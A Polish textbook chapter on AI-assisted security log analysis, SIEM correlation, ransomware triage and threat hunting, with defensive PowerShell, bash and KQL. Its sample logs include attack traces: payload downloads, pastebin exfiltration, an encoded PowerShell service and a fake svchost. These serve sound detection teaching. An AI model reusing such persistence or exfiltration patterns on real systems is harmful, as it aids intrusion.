# Rozdział 7: AI w Bezpieczeństwie IT — Analiza Logów i Wykrywanie Zagrożeń

## Wprowadzenie

Bezpieczeństwo IT to dziedzina, w której ilość danych do analizy rośnie wykładniczo, a czas reakcji na zagrożenia musi być jak najkrótszy. Każdego dnia systemy w typowej organizacji generują miliony wpisów w logach — od prób logowania, przez zmiany konfiguracji, po ruch sieciowy. Znalezienie w tym oceanie danych jednego podejrzanego zdarzenia to jak szukanie igły w stogu siana.

Sztuczna inteligencja (AI, z ang. Artificial Intelligence — technologia umożliwiająca maszynom wykonywanie zadań wymagających ludzkiej inteligencji) zmienia podejście do bezpieczeństwa IT na kilka fundamentalnych sposobów:

- **Analiza logów w skali** — AI może przeanalizować tysiące wpisów w logach w sekundy, identyfikując wzorce niewidoczne dla człowieka
- **Wykrywanie anomalii** — AI uczy się normalnego zachowania systemu i sygnalizuje odchylenia
- **Korelacja zdarzeń** — AI łączy pozornie niezwiązane zdarzenia z różnych źródeł w spójny obraz ataku
- **Automatyzacja odpowiedzi** — AI może sugerować lub automatycznie wykonywać działania obronne
- **Priorytetyzacja alertów** — AI pomaga odróżnić prawdziwe zagrożenia od fałszywych alarmów

W tym rozdziale pokażemy, jak wykorzystać narzędzia AI do praktycznych zadań bezpieczeństwa IT — od analizy logów Windows i syslog, przez wykrywanie zagrożeń, po wsparcie w reagowaniu na incydenty. Wszystkie przykłady są gotowe do użycia i nie wymagają wcześniejszego doświadczenia z AI.

## Podstawowe pojęcia bezpieczeństwa IT i AI

Zanim przejdziemy do praktycznych zastosowań, wyjaśnijmy kluczowe terminy, które będą pojawiać się w tym rozdziale:

- **Log (dziennik zdarzeń)** — automatyczny zapis zdarzeń zachodzących w systemie komputerowym, np. logowania użytkowników, błędy aplikacji, zmiany konfiguracji
- **SIEM (Security Information and Event Management)** — system zbierający logi z wielu źródeł i korelujący je w celu wykrywania zagrożeń. Popularne rozwiązania to Splunk, Microsoft Sentinel, QRadar, Elastic SIEM
- **Windows Event Log** — wbudowany w system Windows mechanizm rejestrowania zdarzeń systemowych, aplikacyjnych i bezpieczeństwa
- **Syslog** — standardowy protokół przesyłania logów w systemach Linux/Unix i urządzeniach sieciowych
- **IOC (Indicator of Compromise)** — wskaźnik kompromitacji, czyli ślad wskazujący na naruszenie bezpieczeństwa (np. podejrzany adres IP, hash złośliwego pliku, nietypowa nazwa procesu)
- **Anomalia** — zachowanie odbiegające od normy, które może wskazywać na zagrożenie
- **False positive (fałszywy alarm)** — alert bezpieczeństwa, który okazuje się nieszkodliwy
- **Threat hunting** — proaktywne poszukiwanie zagrożeń w systemach, zanim zostaną wykryte przez automatyczne narzędzia
- **Incident response (reagowanie na incydenty)** — uporządkowany proces identyfikacji, analizy i neutralizacji zagrożeń bezpieczeństwa
- **CVE (Common Vulnerabilities and Exposures)** — publiczny katalog znanych podatności w oprogramowaniu, każda z unikalnym identyfikatorem (np. CVE-2024-1234)
- **Vulnerability assessment (ocena podatności)** — systematyczne sprawdzanie systemów pod kątem znanych luk bezpieczeństwa

## Dlaczego AI jest przełomem w bezpieczeństwie IT

### Problem skali

Typowy serwer Windows generuje od 10 000 do 100 000 wpisów w Event Logu dziennie. Firewall klasy enterprise — miliony rekordów. System SIEM w średniej organizacji przetwarza gigabajty logów każdego dnia. Żaden zespół bezpieczeństwa nie jest w stanie ręcznie przejrzeć nawet ułamka tych danych.

### Problem kontekstu

Pojedynczy wpis w logu rzadko jest sam w sobie alarmujący. Nieudane logowanie? Zdarza się każdemu. Ale 50 nieudanych logowań z różnych krajów w ciągu 5 minut na to samo konto — to już atak brute force. AI potrafi łączyć takie zdarzenia w kontekst.

### Problem zmęczenia alertami

Zespoły SOC (Security Operations Center — centrum operacji bezpieczeństwa) otrzymują setki alertów dziennie. Badania pokazują, że analitycy bezpieczeństwa doświadczają „alert fatigue" — zmęczenia alertami, przez co mogą przeoczyć prawdziwe zagrożenie. AI pomaga priorytetyzować alerty i redukować fałszywe alarmy.

### Jak AI pomaga w praktyce

| Tradycyjne podejście | Podejście z AI |
|---------------------|----------------|
| Ręczne przeglądanie logów | AI analizuje miliony wpisów w sekundy |
| Statyczne reguły SIEM | AI wykrywa nieznane wzorce ataków |
| Analityk czyta każdy alert | AI priorytetyzuje i grupuje alerty |
| Reagowanie po wykryciu | AI przewiduje potencjalne zagrożenia |
| Ręczne pisanie reguł korelacji | AI automatycznie koreluje zdarzenia |
| Godziny na analizę incydentu | AI generuje wstępną analizę w minuty |

## Analiza logów Windows Event Log z pomocą AI

### Struktura Windows Event Log

Windows Event Log dzieli zdarzenia na kilka kategorii:
- **Security** — logowania, zmiany uprawnień, dostęp do zasobów
- **System** — zdarzenia systemowe, sterowniki, usługi
- **Application** — zdarzenia aplikacji
- **Setup** — instalacje i aktualizacje

Każde zdarzenie ma swój Event ID — numer identyfikujący typ zdarzenia. Najważniejsze Event ID z perspektywy bezpieczeństwa:

| Event ID | Opis | Znaczenie bezpieczeństwa |
|----------|------|--------------------------|
| 4624 | Udane logowanie | Kto się zalogował i skąd |
| 4625 | Nieudane logowanie | Próby ataków brute force |
| 4648 | Logowanie z jawnymi poświadczeniami | Potencjalne lateral movement |
| 4672 | Przypisanie uprawnień specjalnych | Eskalacja uprawnień |
| 4720 | Utworzenie konta użytkownika | Persistence atakującego |
| 4732 | Dodanie do grupy lokalnej | Eskalacja uprawnień |
| 4688 | Utworzenie nowego procesu | Wykonanie złośliwego kodu |
| 4697 | Instalacja usługi | Persistence |
| 1102 | Wyczyszczenie logu Security | Zacieranie śladów |
| 7045 | Instalacja nowej usługi (System) | Persistence |

### Eksportowanie logów do analizy

Zanim użyjemy AI do analizy, musimy wyeksportować logi w czytelnym formacie. Oto kilka metod:

**PowerShell — eksport ostatnich 24h logów Security:**
```powershell
# Eksport zdarzeń bezpieczeństwa z ostatnich 24 godzin do CSV
$startTime = (Get-Date).AddHours(-24)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    StartTime = $startTime
} | Select-Object TimeCreated, Id, LevelDisplayName, Message |
Export-Csv -Path "C:\Logs\security_24h.csv" -NoTypeInformation -Encoding UTF8
```

**PowerShell — eksport nieudanych logowań:**
```powershell
# Eksport wszystkich nieudanych logowań (Event ID 4625)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4625
} -MaxEvents 1000 | Select-Object TimeCreated, 
    @{N='TargetAccount';E={$_.Properties[5].Value}},
    @{N='SourceIP';E={$_.Properties[19].Value}},
    @{N='LogonType';E={$_.Properties[10].Value}} |
Export-Csv -Path "C:\Logs\failed_logons.csv" -NoTypeInformation
```

### Praktyczny przykład 1: Analiza podejrzanych logowań z AI

**Scenariusz:** Otrzymałeś alert z systemu monitoringu o zwiększonej liczbie nieudanych logowań na serwerze produkcyjnym. Musisz szybko ocenić, czy to atak, czy normalna aktywność (np. użytkownik zapomniał hasła).

**Krok 1: Eksportuj dane**

Użyj powyższego skryptu PowerShell do wyeksportowania nieudanych logowań. Załóżmy, że masz plik CSV z następującymi danymi (fragment):

```csv
TimeCreated,TargetAccount,SourceIP,LogonType
2024-03-15 02:14:33,admin,185.234.72.15,10
2024-03-15 02:14:35,admin,185.234.72.15,10
2024-03-15 02:14:37,administrator,185.234.72.15,10
2024-03-15 02:14:39,root,185.234.72.15,10
2024-03-15 02:14:41,sa,185.234.72.15,10
2024-03-15 02:15:01,admin,91.108.56.200,10
2024-03-15 02:15:03,test,91.108.56.200,10
2024-03-15 08:45:12,jan.kowalski,192.168.1.50,2
2024-03-15 08:45:15,jan.kowalski,192.168.1.50,2
2024-03-15 08:45:20,jan.kowalski,192.168.1.50,2
```

**Krok 2: Prompt do AI**

```
Przeanalizuj poniższe logi nieudanych logowań Windows (Event ID 4625) 
pod kątem bezpieczeństwa. Dla każdego wzorca określ:
1. Czy to prawdopodobny atak czy normalna aktywność
2. Typ ataku (jeśli dotyczy)
3. Poziom zagrożenia (niski/średni/wysoki/krytyczny)
4. Rekomendowane działania

Kontekst środowiska:
- Sieć wewnętrzna: 192.168.1.0/24
- Serwer: Windows Server 2022, kontroler domeny
- Normalne godziny pracy: 7:00-18:00
- Konta serwisowe: svc_backup, svc_monitor

LOGI:
[wklej zawartość CSV]
```

**Krok 3: Interpretacja odpowiedzi AI**

AI powinna zidentyfikować następujące wzorce:

1. **Atak brute force z zewnątrz** (185.234.72.15) — próby na typowe konta (admin, administrator, root, sa) z jednego IP zewnętrznego, w krótkich odstępach czasu. Zagrożenie: WYSOKIE.

2. **Skanowanie kont z drugiego IP** (91.108.56.200) — próby na konta admin i test, również z zewnątrz. Zagrożenie: ŚREDNIE.

3. **Normalna aktywność użytkownika** (192.168.1.50, jan.kowalski) — trzy próby z sieci wewnętrznej, w godzinach pracy, na konkretne konto. Prawdopodobnie zapomniał hasła. Zagrożenie: NISKIE.

**Krok 4: Działania na podstawie analizy AI**

Na podstawie analizy AI możesz podjąć konkretne kroki:

```powershell
# Zablokuj podejrzane IP na firewallu Windows
New-NetFirewallRule -DisplayName "Block Brute Force IP 1" `
    -Direction Inbound -Action Block `
    -RemoteAddress 185.234.72.15

New-NetFirewallRule -DisplayName "Block Brute Force IP 2" `
    -Direction Inbound -Action Block `
    -RemoteAddress 91.108.56.200

# Sprawdź czy konto jan.kowalski nie jest zablokowane
Get-ADUser jan.kowalski -Properties LockedOut, BadLogonCount
```

**Dlaczego to działa:** AI potrafi natychmiast rozpoznać wzorce, które analityk musiałby identyfikować ręcznie — sekwencyjne próby na typowe konta, zewnętrzne IP, nietypowe godziny. Oszczędza to godziny pracy i pozwala szybciej reagować.

## Analiza logów Syslog z pomocą AI

### Struktura Syslog

Syslog to standardowy format logów w systemach Linux/Unix i urządzeniach sieciowych (routery, switche, firewalle). Każdy wpis syslog zawiera:
- **Timestamp** — data i czas zdarzenia
- **Facility** — źródło zdarzenia (kern, auth, daemon, local0-7)
- **Severity** — poziom ważności (0=Emergency do 7=Debug)
- **Hostname** — nazwa hosta generującego log
- **Message** — treść komunikatu

Poziomy severity w syslog:

| Poziom | Nazwa | Opis |
|--------|-------|------|
| 0 | Emergency | System niezdatny do użytku |
| 1 | Alert | Wymagana natychmiastowa akcja |
| 2 | Critical | Warunki krytyczne |
| 3 | Error | Błędy |
| 4 | Warning | Ostrzeżenia |
| 5 | Notice | Normalne, ale istotne zdarzenia |
| 6 | Informational | Komunikaty informacyjne |
| 7 | Debug | Komunikaty debugowania |

### Typowe źródła logów bezpieczeństwa w Linux

```bash
# Logi autoryzacji (logowania, sudo, SSH)
/var/log/auth.log        # Debian/Ubuntu
/var/log/secure          # RHEL/CentOS

# Logi systemowe
/var/log/syslog          # Debian/Ubuntu
/var/log/messages        # RHEL/CentOS

# Logi firewalla
/var/log/ufw.log         # Ubuntu UFW
/var/log/firewalld       # RHEL firewalld

# Logi audytu
/var/log/audit/audit.log # auditd
```

### Przygotowanie logów do analizy AI

```bash
# Wyciągnij logi SSH z ostatnich 24h
journalctl -u sshd --since "24 hours ago" --no-pager > /tmp/ssh_logs.txt

# Wyciągnij nieudane logowania SSH
grep "Failed password" /var/log/auth.log | tail -100 > /tmp/failed_ssh.txt

# Wyciągnij logi firewalla (zablokowane połączenia)
grep "BLOCK" /var/log/ufw.log | tail -200 > /tmp/firewall_blocked.txt

# Podsumowanie statystyczne nieudanych logowań
grep "Failed password" /var/log/auth.log | \
    awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20
```

### Analiza logów syslog z AI — workflow

**Krok 1:** Wyeksportuj interesujące logi (np. ostatnie 24h logów auth)

**Krok 2:** Użyj promptu do analizy:

```
Przeanalizuj poniższe logi syslog z serwera Linux pod kątem 
bezpieczeństwa. Zidentyfikuj:

1. Wzorce ataków (brute force, skanowanie portów, eskalacja uprawnień)
2. Podejrzane konta lub IP
3. Anomalie w normalnym zachowaniu systemu
4. Rekomendacje dotyczące hardening'u

Kontekst:
- Serwer: Ubuntu 22.04 LTS, rola: web server + baza danych
- Sieć wewnętrzna: 10.0.0.0/8
- Autoryzowani administratorzy: admin1, admin2
- Normalne źródła SSH: 10.0.1.0/24 (biuro IT)

LOGI:
[wklej zawartość pliku logów]
```

**Krok 3:** AI zidentyfikuje wzorce i zaproponuje działania. Typowe znaleziska:
- Ataki brute force SSH z zewnętrznych IP
- Próby logowania na nieistniejące konta (rekonesans)
- Udane logowania z nietypowych lokalizacji
- Eskalacja uprawnień (sudo) przez nieautoryzowane konta
- Nietypowe procesy uruchamiane w nocy

## AI w systemach SIEM

### Czym jest SIEM i jak AI go wzmacnia

System SIEM (Security Information and Event Management) to centralna platforma bezpieczeństwa, która:
1. **Zbiera** logi z wielu źródeł (serwery, firewalle, aplikacje, endpointy)
2. **Normalizuje** dane do wspólnego formatu
3. **Koreluje** zdarzenia z różnych źródeł
4. **Alertuje** na podstawie reguł i anomalii
5. **Raportuje** dla celów compliance i audytu

Popularne rozwiązania SIEM:
- **Microsoft Sentinel** — chmurowy SIEM z wbudowanym AI (Azure)
- **Splunk** — lider rynku, potężne możliwości wyszukiwania
- **Elastic SIEM** — open source, oparty na Elasticsearch
- **IBM QRadar** — enterprise SIEM z AI (Watson)
- **Wazuh** — darmowy, open source SIEM/XDR

### Jak AI wspiera pracę z SIEM

Nawet jeśli Twoja organizacja nie ma dedykowanego SIEM, możesz wykorzystać AI do zadań typowo realizowanych przez SIEM:

**1. Korelacja zdarzeń z wielu źródeł**

```
Mam logi z trzech źródeł dotyczące tego samego przedziału czasowego 
(2024-03-15, 14:00-15:00). Skoreluj zdarzenia i określ, 
czy mogą wskazywać na atak:

ŹRÓDŁO 1 - Firewall (zablokowane połączenia):
14:02 BLOCK TCP 203.0.113.50 -> 10.0.1.100:445
14:02 BLOCK TCP 203.0.113.50 -> 10.0.1.100:3389
14:03 BLOCK TCP 203.0.113.50 -> 10.0.1.101:445
14:03 BLOCK TCP 203.0.113.50 -> 10.0.1.101:3389
[...skanowanie kolejnych IP w podsieci...]

ŹRÓDŁO 2 - Windows Event Log (serwer 10.0.1.105):
14:15 Event 4625 - Failed logon, user: admin, source: 203.0.113.50
14:15 Event 4625 - Failed logon, user: administrator, source: 203.0.113.50
14:16 Event 4624 - Successful logon, user: svc_backup, source: 203.0.113.50
14:17 Event 4672 - Special privileges assigned to svc_backup

ŹRÓDŁO 3 - Proxy/DNS:
14:18 10.0.1.105 -> DNS query: pastebin.com
14:19 10.0.1.105 -> HTTPS POST: pastebin.com/api/api_post.php
14:20 10.0.1.105 -> DNS query: raw.githubusercontent.com
14:21 10.0.1.105 -> HTTPS GET: raw.githubusercontent.com/[...]/payload.ps1
```

AI powinna zidentyfikować pełny łańcuch ataku:
1. **Rekonesans** (14:02-14:03) — skanowanie portów w podsieci
2. **Brute force** (14:15-14:16) — próby logowania, udane na koncie serwisowym
3. **Eskalacja uprawnień** (14:17) — konto serwisowe z uprawnieniami specjalnymi
4. **Exfiltracja/C2** (14:18-14:21) — komunikacja z zewnętrznymi serwisami, pobranie payloadu

**2. Tworzenie reguł korelacji**

```
Na podstawie poniższego scenariusza ataku, napisz regułę korelacji 
dla systemu SIEM (w pseudokodzie lub formacie Sigma), która wykryje 
podobne ataki w przyszłości:

Scenariusz: Atakujący skanuje porty w podsieci, następnie wykonuje 
brute force na znalezionych usługach, a po udanym logowaniu 
nawiązuje komunikację z zewnętrznym serwerem C2.

Parametry detekcji:
- Okno czasowe: 30 minut
- Próg skanowania: >10 unikalnych portów lub >10 unikalnych IP z jednego źródła
- Próg brute force: >5 nieudanych logowań z jednego IP w 5 minut
- Wskaźnik C2: połączenie wychodzące do nowego (niespotykanego wcześniej) 
  zewnętrznego IP w ciągu 10 minut od udanego logowania
```

**3. Redukcja fałszywych alarmów**

```
Otrzymuję zbyt wiele fałszywych alarmów z mojego SIEM. 
Oto 10 ostatnich alertów z ich kontekstem. Dla każdego określ:
- Prawdopodobieństwo prawdziwego zagrożenia (1-10)
- Uzasadnienie oceny
- Czy alert wymaga tuning'u (zmiana progu, dodanie wyjątku)

[lista alertów z kontekstem]
```

## Praktyczny przykład 2: Analiza incydentu bezpieczeństwa z AI

**Scenariusz:** W poniedziałek rano zespół IT odkrywa, że na jednym z serwerów plików pojawiły się podejrzane pliki z rozszerzeniem `.encrypted`. Kilku użytkowników zgłasza, że nie mogą otworzyć swoich dokumentów. Podejrzewasz ransomware. Musisz szybko przeprowadzić wstępną analizę incydentu.

**Krok 1: Zbierz dowody**

```powershell
# Znajdź zaszyfrowane pliki
Get-ChildItem -Path "D:\SharedFiles" -Recurse -Filter "*.encrypted" |
    Select-Object FullName, CreationTime, LastWriteTime |
    Export-Csv "C:\Incident\encrypted_files.csv" -NoTypeInformation

# Sprawdź ostatnio zmodyfikowane pliki (potencjalny moment infekcji)
Get-ChildItem -Path "D:\SharedFiles" -Recurse |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-48) } |
    Sort-Object LastWriteTime -Descending |
    Select-Object FullName, LastWriteTime, Length |
    Export-Csv "C:\Incident\recent_modified.csv" -NoTypeInformation

# Sprawdź zaplanowane zadania (persistence)
Get-ScheduledTask | Where-Object {$_.Date -gt (Get-Date).AddDays(-7)} |
    Select-Object TaskName, TaskPath, Date, Author |
    Export-Csv "C:\Incident\new_scheduled_tasks.csv" -NoTypeInformation

# Sprawdź nowe usługi (persistence)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 50 |
    Select-Object TimeCreated, 
    @{N='ServiceName';E={$_.Properties[0].Value}},
    @{N='ImagePath';E={$_.Properties[1].Value}} |
    Export-Csv "C:\Incident\new_services.csv" -NoTypeInformation

# Sprawdź aktywne połączenia sieciowe
Get-NetTCPConnection -State Established |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort,
    @{N='Process';E={(Get-Process -Id $_.OwningProcess).ProcessName}} |
    Export-Csv "C:\Incident\active_connections.csv" -NoTypeInformation

# Eksportuj logi Security z ostatnich 48h
$start = (Get-Date).AddHours(-48)
Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$start} |
    Select-Object TimeCreated, Id, Message |
    Export-Csv "C:\Incident\security_logs_48h.csv" -NoTypeInformation
```

**Krok 2: Analiza z AI — prompt do wstępnej oceny**

```
Przeprowadź wstępną analizę incydentu bezpieczeństwa (triage) 
na podstawie poniższych danych. Podejrzenie: ransomware.

KONTEKST:
- Serwer: Windows Server 2022, rola: file server
- Odkrycie: poniedziałek 8:00, pliki .encrypted na udziale sieciowym
- Ostatni znany dobry stan: piątek 17:00 (backup)
- Sieć: 10.0.0.0/16, serwer: 10.0.1.50

DANE 1 - Zaszyfrowane pliki (fragment):
FullName,CreationTime,LastWriteTime
D:\SharedFiles\Finanse\raport_Q1.xlsx.encrypted,2024-03-17 03:14:22,2024-03-17 03:14:22
D:\SharedFiles\Finanse\budzet_2024.xlsx.encrypted,2024-03-17 03:14:25,2024-03-17 03:14:25
D:\SharedFiles\HR\umowy\*.encrypted,2024-03-17 03:15:01,2024-03-17 03:15:01
[...setki plików, wszystkie z timestamp ~03:14-03:45...]

DANE 2 - Nowe zaplanowane zadania:
TaskName,TaskPath,Date,Author
UpdateService,\Microsoft\Windows\,2024-03-16 22:30:00,SYSTEM
CleanTemp,\,2024-03-16 22:31:00,NT AUTHORITY\SYSTEM

DANE 3 - Nowe usługi:
TimeCreated,ServiceName,ImagePath
2024-03-16 22:28:15,WindowsUpdateSvc,C:\Windows\Temp\svchost.exe -k netsvcs
2024-03-16 22:29:00,SystemHealthMonitor,powershell.exe -enc [base64string]

DANE 4 - Aktywne połączenia (podejrzane):
LocalAddress,RemoteAddress,RemotePort,Process
10.0.1.50,185.141.63.120,443,svchost
10.0.1.50,91.219.236.222,8443,powershell

DANE 5 - Logi Security (kluczowe zdarzenia):
2024-03-16 22:25:00,4624,Logon success - user: admin, source: 10.0.2.15, type: 3
2024-03-16 22:26:00,4672,Special privileges - user: admin
2024-03-16 22:28:00,4697,Service installed: WindowsUpdateSvc
2024-03-16 22:30:00,4698,Scheduled task created: UpdateService

Proszę o:
1. Oś czasu ataku (timeline)
2. Wektor wejścia (jak atakujący dostał się do systemu)
3. Techniki użyte przez atakującego (MITRE ATT&CK jeśli możliwe)
4. IOC (wskaźniki kompromitacji) do zablokowania
5. Natychmiastowe działania do podjęcia
6. Plan dalszej analizy
```

**Krok 3: Interpretacja i działania**

AI powinna wygenerować szczegółową analizę, np.:

**Oś czasu ataku:**
- 22:25 — Logowanie konta admin z 10.0.2.15 (lateral movement z innego serwera)
- 22:26 — Eskalacja uprawnień
- 22:28-22:31 — Instalacja persistence (usługa + scheduled task)
- 03:14-03:45 — Szyfrowanie plików (uruchomione przez scheduled task)

**IOC do natychmiastowego zablokowania:**
- IP: 185.141.63.120, 91.219.236.222
- Plik: C:\Windows\Temp\svchost.exe (fałszywy svchost w nietypowej lokalizacji)
- Scheduled task: UpdateService, CleanTemp
- Usługa: WindowsUpdateSvc, SystemHealthMonitor

**Natychmiastowe działania:**
1. Odizoluj serwer od sieci (ale NIE wyłączaj — zachowaj pamięć RAM)
2. Zablokuj IOC na firewallu perimetrowym
3. Sprawdź serwer 10.0.2.15 (źródło lateral movement)
4. Zweryfikuj integralność backupów z piątku
5. Powiadom zespół zarządzania incydentami

**Dlaczego to działa:** AI w kilka minut generuje analizę, która doświadczonemu analitykowi zajęłaby godziny. Łączy dane z wielu źródeł, identyfikuje techniki ataku i proponuje konkretne działania. To nie zastępuje eksperta, ale dramatycznie przyspiesza wstępną fazę reagowania.

## AI w wykrywaniu zagrożeń (Threat Detection)

### Proaktywne wyszukiwanie zagrożeń z AI

Threat hunting to proaktywne podejście do bezpieczeństwa — zamiast czekać na alert, aktywnie szukamy śladów kompromitacji. AI jest idealnym partnerem w tym procesie, ponieważ może:

1. **Generować hipotezy** — na podstawie aktualnych trendów zagrożeń
2. **Tworzyć zapytania** — KQL (Kusto Query Language), SPL (Splunk), Lucene
3. **Analizować wyniki** — identyfikować anomalie w dużych zbiorach danych
4. **Sugerować kolejne kroki** — pogłębiać analizę w odpowiednim kierunku

### Generowanie hipotez threat hunting z AI

```
Jestem analitykiem bezpieczeństwa w firmie telekomunikacyjnej 
(500 pracowników, infrastruktura: Windows AD, Linux servers, 
Cisco networking, VMware virtualization).

Na podstawie aktualnych trendów zagrożeń dla sektora telekomunikacyjnego, 
zaproponuj 5 hipotez threat hunting, które powinienem zbadać. 
Dla każdej hipotezy podaj:
1. Opis zagrożenia
2. Technikę MITRE ATT&CK
3. Jakie logi/dane sprawdzić
4. Konkretne zapytanie (KQL lub grep/awk dla Linux)
5. Co uznać za podejrzane (kryteria)
```

### Tworzenie zapytań do SIEM z AI

Zamiast ręcznie pisać skomplikowane zapytania, możesz poprosić AI:

```
Napisz zapytanie KQL (Kusto Query Language) dla Microsoft Sentinel, 
które wykryje potencjalny atak Pass-the-Hash w środowisku 
Windows Active Directory.

Kryteria detekcji:
- Logowanie typu 3 (network) z użyciem NTLM
- Z konta, które normalnie loguje się interaktywnie (typ 2 lub 10)
- W ciągu ostatnich 24 godzin
- Wykluczając konta serwisowe (prefix: svc_)

Format: gotowe zapytanie KQL z komentarzami wyjaśniającymi każdą sekcję.
```

Przykładowa odpowiedź AI:

```kql
// Detekcja potencjalnego Pass-the-Hash
// Szukamy logowań sieciowych (typ 3) NTLM dla kont, 
// które normalnie logują się interaktywnie
let timeRange = 24h;
let serviceAccounts = dynamic(["svc_backup", "svc_monitor", "svc_sql"]);
// Konta z normalnymi logowaniami interaktywnymi
let interactiveUsers = SecurityEvent
    | where TimeGenerated > ago(30d)
    | where EventID == 4624
    | where LogonType in (2, 10) // Interactive, RemoteInteractive
    | where AccountType == "User"
    | where Account !in (serviceAccounts)
    | distinct Account;
// Szukamy tych samych kont z logowaniem sieciowym NTLM
SecurityEvent
| where TimeGenerated > ago(timeRange)
| where EventID == 4624
| where LogonType == 3 // Network
| where AuthenticationPackageName == "NTLM"
| where Account in (interactiveUsers)
| where Account !in (serviceAccounts)
| summarize 
    AttemptCount = count(),
    SourceIPs = make_set(IpAddress),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated)
    by Account, Computer
| where AttemptCount > 3
| order by AttemptCount desc
```

### Analiza ruchu sieciowego pod kątem C2

Komunikacja z serwerami Command & Control (C2 — serwer kontrolowany przez atakującego, służący do zdalnego sterowania zainfekowanymi maszynami) ma charakterystyczne cechy, które AI może pomóc zidentyfikować:

```
Przeanalizuj poniższe dane o ruchu sieciowym i zidentyfikuj 
potencjalną komunikację C2 (Command & Control). 

Cechy typowej komunikacji C2:
- Regularne beaconing (połączenia w stałych odstępach)
- Nietypowe porty dla danego protokołu
- Duża ilość danych wysyłanych (exfiltracja)
- Połączenia do IP bez rekordu DNS (direct-to-IP)
- Długie sesje z małą ilością danych (heartbeat)
- Komunikacja w nietypowych godzinach

DANE (NetFlow z ostatnich 24h, top 50 połączeń wychodzących 
posortowanych po liczbie sesji):
[wklej dane NetFlow]
```

## AI w ocenie podatności (Vulnerability Assessment)

### Priorytetyzacja podatności z AI

Skanery podatności (np. Nessus, Qualys, OpenVAS) generują setki lub tysiące znalezisk. Nie wszystkie są równie krytyczne. AI pomaga priorytetyzować:

```
Mam wyniki skanowania podatności (Nessus) dla 50 serwerów. 
Znaleziono 847 podatności. Pomóż mi priorytetyzować naprawy.

KONTEKST ŚRODOWISKA:
- Serwery produkcyjne (dostępne z internetu): web01, web02, api01
- Serwery wewnętrzne (tylko LAN): db01, db02, file01, ad01
- Serwery deweloperskie: dev01-dev10
- Krytyczne dane: baza klientów na db01, AD na ad01

TOP 20 PODATNOŚCI (posortowane po CVSS):
[lista z: CVE ID, CVSS score, affected host, opis]

Dla każdej podatności określ:
1. Rzeczywiste ryzyko (uwzględniając kontekst — czy serwer jest 
   dostępny z internetu, czy ma krytyczne dane)
2. Priorytet naprawy (P1-krytyczny do P4-niski)
3. Czy istnieje znany exploit (jeśli wiesz)
4. Sugerowane działanie (patch, workaround, accept risk)
```

### Analiza CVE z AI

Gdy pojawia się nowa krytyczna podatność, AI pomaga szybko ocenić wpływ:

```
Przeanalizuj podatność CVE-2024-XXXXX pod kątem mojego środowiska:

PODATNOŚĆ:
[opis CVE, affected software, CVSS score]

MOJE ŚRODOWISKO:
- 20 serwerów Windows Server 2022
- 15 serwerów Ubuntu 22.04
- Cisco ASA 5525-X (firmware 9.16)
- VMware vSphere 8.0 Update 2
- Microsoft 365 E3

Proszę o:
1. Czy moje systemy są podatne?
2. Jakie warunki muszą być spełnione do exploitacji?
3. Czy istnieją czynniki łagodzące w moim środowisku?
4. Rekomendowane działania (natychmiastowe i długoterminowe)
5. Jak zweryfikować, czy nie zostaliśmy już zaatakowani (IOC)
```

### Generowanie planów remediacji

```
Na podstawie poniższej listy krytycznych podatności, 
wygeneruj plan remediacji z uwzględnieniem:
- Okien serwisowych (niedziela 2:00-6:00)
- Zależności między systemami
- Kolejności patchowania (najpierw perimeter, potem wewnętrzne)
- Planów rollback dla każdego kroku
- Testów weryfikacyjnych po każdym patchu

PODATNOŚCI DO NAPRAWY:
[lista]
```

## AI w automatyzacji bezpieczeństwa

### Tworzenie skryptów bezpieczeństwa z AI

AI może generować skrypty do automatyzacji rutynowych zadań bezpieczeństwa:

**Skrypt do monitorowania podejrzanych procesów:**

```
Napisz skrypt PowerShell, który:
1. Co 5 minut sprawdza listę uruchomionych procesów
2. Porównuje z baseline'em (lista znanych dobrych procesów)
3. Jeśli znajdzie nowy, nieznany proces:
   a. Zapisuje szczegóły (nazwa, PID, ścieżka, hash, użytkownik)
   b. Sprawdza czy proces komunikuje się z internetem
   c. Wysyła alert e-mail do zespołu bezpieczeństwa
4. Loguje wszystko do pliku z rotacją (max 30 dni)

Środowisko: Windows Server 2022, PowerShell 7.x
Baseline procesów: zapisany w C:\Security\baseline_processes.json
```

**Skrypt do automatycznego blokowania IP po wykryciu brute force:**

```
Napisz skrypt bash dla Linux (Ubuntu 22.04), który:
1. Monitoruje /var/log/auth.log w czasie rzeczywistym
2. Zlicza nieudane logowania SSH per IP
3. Jeśli IP przekroczy 10 nieudanych prób w 5 minut:
   a. Automatycznie dodaje regułę blokującą w UFW
   b. Loguje zdarzenie z timestamp i IP
   c. Po 24h automatycznie usuwa blokadę
4. Nie blokuje IP z whitelisty (plik /etc/security/whitelist.txt)
5. Działa jako usługa systemd

Uwzględnij: obsługę błędów, logowanie, graceful shutdown.
```

### Tworzenie polityk bezpieczeństwa z AI

```
Stwórz politykę bezpieczeństwa dla zarządzania kontami 
uprzywilejowanymi (Privileged Access Management) w organizacji 
IT/telekomunikacyjnej (200 pracowników, 100 serwerów).

Polityka powinna zawierać:
1. Definicje kont uprzywilejowanych
2. Zasady przyznawania dostępu (principle of least privilege)
3. Wymagania dotyczące haseł i MFA
4. Procedury przeglądu dostępów (częstotliwość, odpowiedzialność)
5. Monitoring i audyt użycia kont uprzywilejowanych
6. Procedury awaryjne (break-glass accounts)
7. Zgodność z normami (ISO 27001, NIS2)

Format: dokument gotowy do zatwierdzenia przez CISO, 
w języku polskim, z numeracją sekcji.
```

## AI w reagowaniu na incydenty (Incident Response)

### Framework reagowania na incydenty

Reagowanie na incydenty bezpieczeństwa składa się z kilku faz, w każdej z których AI może pomóc:

| Faza | Opis | Jak AI pomaga |
|------|------|---------------|
| **Przygotowanie** | Plany, procedury, narzędzia | Generowanie playbook'ów, checklist |
| **Identyfikacja** | Wykrycie i potwierdzenie incydentu | Analiza logów, korelacja zdarzeń |
| **Powstrzymanie** | Ograniczenie rozprzestrzeniania | Sugestie izolacji, reguły firewall |
| **Eliminacja** | Usunięcie zagrożenia | Identyfikacja IOC, skrypty czyszczące |
| **Odzyskiwanie** | Przywrócenie normalnej pracy | Plany odtwarzania, weryfikacja |
